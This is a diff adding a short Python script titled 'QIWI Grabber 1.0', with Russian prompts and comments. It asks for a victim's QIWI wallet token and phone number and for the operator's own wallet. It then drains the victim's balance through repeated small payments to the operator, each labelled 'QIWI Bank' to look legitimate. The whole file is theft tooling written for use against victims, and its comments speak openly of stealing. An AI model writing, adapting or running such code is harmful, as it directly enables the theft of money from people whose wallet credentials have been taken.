@@ -1,0 +1,26 @@
+from SimpleQIWI import *
+import time
+
+print("QIWI Grabber 1.0")
+token = input("Токен Кошелька Жертвы: ")
+phone = input("Телефон Кошелька Жертвы: ")
+qiwi = input("Ваш киви для приёма денег: ")
+
+num = 1
+while num < 10:
+    api = QApi(token=token, phone=phone)
+    print("Баланс Жертвы:")
+    b = api.balance
+    g = [5.0] #Сумма после которой у жертвы спишутся деньги. Например 50.0 (50р) если на балансе будет 51р и больше, програма начнет списание денег.
+    print(b)
+
+    if b > g:
+        while b != g:
+            api = QApi(token=token, phone=phone)
+            b = api.balance
+            api.pay(account=qiwi, amount=3, comment="QIWI Bank") #В amount= указываем какими частями переводить, например 1 (1руб), тогда программа начнет воровать баланс несколькими транзакциями по одному рублю
+            print("Списание...")
+        print("Все деньги сняты :))")
+    time.sleep(5) #Задержка в сек
+input()
+
